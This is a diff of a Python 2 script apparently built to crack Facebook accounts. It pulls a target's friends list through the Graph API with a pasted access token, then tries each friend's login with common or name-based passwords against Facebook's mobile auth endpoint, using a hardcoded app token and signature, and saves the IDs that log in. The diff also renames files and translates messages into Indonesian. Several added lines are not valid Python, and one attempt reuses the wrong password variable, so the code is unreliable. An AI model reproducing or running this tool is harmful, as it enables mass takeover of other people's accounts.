@@ -1,4 +1,4 @@
-#coding:utf-8
+ #coding:utf-8
 #!/user/bin/python2
 #coding by Zakarya
 try:    
@@ -9,9 +9,9 @@ try:
 except ImportError:
     os.system('pip2 install requests')
     os.system('pip2 install mechanize')
-    os.system('python2 Clone.py')
+    os.system('python2 Acid.py')
 try:
-    os.mkdir('Clone')
+    os.mkdir('FUCK')
 except OSError:
     pass
 
@@ -36,11 +36,13 @@ def acak(b):
 
 
 logo = ''' 
- ____    __    _  _    __    ____  _  _    __   
-(_   )  /__\  ( )/ )  /__\  (  _ \( \/ )  /__\  
- / /_  /(  )\  )  (  /(  )\  )   / \  /  /(  )\ 
-(____)(__)(__)(_)\_)(__)(__)(_)\_) (__) (__)(__)
-
+┏━━━━┓━━━┓┓┏━┓━━━┓━━━┓┓━━┏┓━━━┓
+┗━━┓━┃┏━┓┃┃┃┏┛┏━┓┃┏━┓┃┗┓┏┛┃┏━┓┃
+━━┏┛┏┛┃━┃┃┗┛┛━┃━┃┃┗━┛┃┓┗┛┏┛┃━┃┃
+━┏┛┏┛━┗━┛┃┏┓┃━┗━┛┃┏┓┏┛┗┓┏┛━┗━┛┃
+┏┛━┗━┓┏━┓┃┃┃┗┓┏━┓┃┃┃┗┓━┃┃━━┏━┓┃
+┗━━━━┛┛━┗┛┛┗━┛┛━┗┛┛┗━┛━┗┛━━┛━┗┛
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 '''
 idh = []
 
@@ -65,16 +67,13 @@ def pilog():
         print ("Facebook  :  Sayyed Zakarya Bacha ")
         print 
         token = raw_input("[+] Past Your Token Here : ")
-        sav = open(".logacid.txt","w")
-        sav.write(token)
-        sav.close()
-        print ("\r\033[1;32m[✓] Login Successfully\033[0;97m")
+        sav = open(".logfuck.txt","w")
         time.sleep(1)
         bot_fl()
     elif og =="0":
         exit()
     else:
-        print ("[!] Select In The Above")
+        print ("[!] Pilih Yang Bener Dong")
         pilog()
         
 def bot_fl():
@@ -92,7 +91,7 @@ def menu():
         token = open(".logfuck.txt","r").read()
     except IOError:
         print logo
-        print("[!] Token Error or Toke Not Found")
+        print("[!] Kesalahan Token. Token Tidak Ditemukan")
         os.system("rm -rf .logfuck.txt")
         time.sleep(1)
         logmen()
@@ -103,17 +102,17 @@ def menu():
     except KeyError:
         os.system("clear")
         print logo
-        print("[!] Fail To Load Your Account Is It Checkpiont")
+        print("[!] Sorry Your Account Is On Checkpoint")
         os.system("rm -rf .logfuck.txt")
         time.sleep(1)
         logmen()
     os.system("clear")
     print logo
-    print("Welcome "+name)
-    print ("Please Select")
+    print("Selamat Datang "+name)
+    print ("Silahkan Pilih")
     print
-    print("[1] Start Crack")
-    print("[\x1b[91m0\x1b[0m] Exit")
+    print("[1] Start Cracking")
+    print("[\x1b[91m0\x1b[0m] Keluar")
     pil()
     
 def pil():
@@ -122,12 +121,12 @@ def pil():
         cramen()
     elif ti =='0':
         os.system('rm -rf .logfuck.txt')
-        print '[√] Deleting Token Successfully.'
+        print '[√] Menghapus Token Berhasil.'
         time.sleep(1)
         os.system('exit')
         logmen()
     else:
-        print '[!] Chose Serious Please'
+        print '[!] Pilih Yang Bener Dong'
         pil()
         
 def cramen():
@@ -136,7 +135,7 @@ def cramen():
 	try:
 		token=open(".logfuck.txt","r").read()
 	except IOError:
-		print("[!] Token Error. Token Not Working")
+		print("[!] Kesalahan Token . Token Tidak Berfungsi")
 		os.system("rm -rf .logfuck.txt")
 		time.sleep(1)
 		logmen()
@@ -164,15 +163,15 @@ def crapil():
 	elif select =="1":
 		os.system("clear")
 		print logo
-		idt = raw_input("[+] Enter Target ID : ")
+		idt = raw_input("[+] Target ID : ")
 		os.system("clear")
 		print logo
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
-			print("[✓] Account name : "+q["name"])
+			print("[✓] Name : "+q["name"])
 		except KeyError:
-			print('\n[!] ID error . ID : '+idt+' Unlisted Friends')
+			print('\n[!] Fb ID . ID : '+idt+' Teman Tidak Public')
 			raw_input("\nBack ")
 			cramen()
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
@@ -186,7 +185,7 @@ def crapil():
 	elif select =="0":
 		menu()
 	else:
-		print ("[!] Chose Serious Please")
+		print ("[!] Pilih Yang Bener Dong")
 		crapil()
 	print("[✓] Total ID : "+str(len(id)))
 	time.sleep(0.5)
@@ -197,7 +196,7 @@ def crapil():
 		user=arg
 		uid,name=user.split("|")
 		try:
-		    pass1='Pakistan'
+		    pass1='786786'
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		    d=json.loads(q)
 		    if 'www.facebook.com' in d['error_msg']:
@@ -214,7 +213,7 @@ def crapil():
 		            ok.close()
 		            oks.append(uid)
 		        else:
-		            pass2='name+"@#&+£"'
+		            pass2='Pakistan'
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		            d=json.loads(q)
 		            if 'www.facebook.com' in d['error_msg']:
@@ -231,7 +230,7 @@ def crapil():
 		                    ok.close()
 		                    oks.append(uid)
 		                else:
-		                    pass3=name+"12345"
+		                    pass3=1st name+"12345"
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                    d=json.loads(q)
 		                    if 'www.facebook.com' in d['error_msg']:
@@ -248,7 +247,7 @@ def crapil():
 		                            ok.close()
 		                            oks.append(uid)
 		                        else:
-		                            pass4="786786"
+		                            pass4=2nd name+"123"
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
@@ -265,7 +264,7 @@ def crapil():
 		                                    ok.close()
 		                                    oks.append(uid)
 		                                else:
-		                                    pass5=name+"123@£#"
+		                                    pass5=1st name+"12@#"
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
@@ -282,7 +281,7 @@ def crapil():
 		                                            ok.close()
 		                                            oks.append(uid)
 		                                        else:
-		                                            pass6="Pakistan123"
+		                                            pass6="1234567"
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                            d=json.loads(q)
 		                                            if 'www.facebook.com' in d['error_msg']:
@@ -299,7 +298,7 @@ def crapil():
 		                                                    ok.close()
 		                                                    oks.append(uid)
 		                                                else:
-		                                                    pass7= "1234567890"
+		                                                    pass7= "889900"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
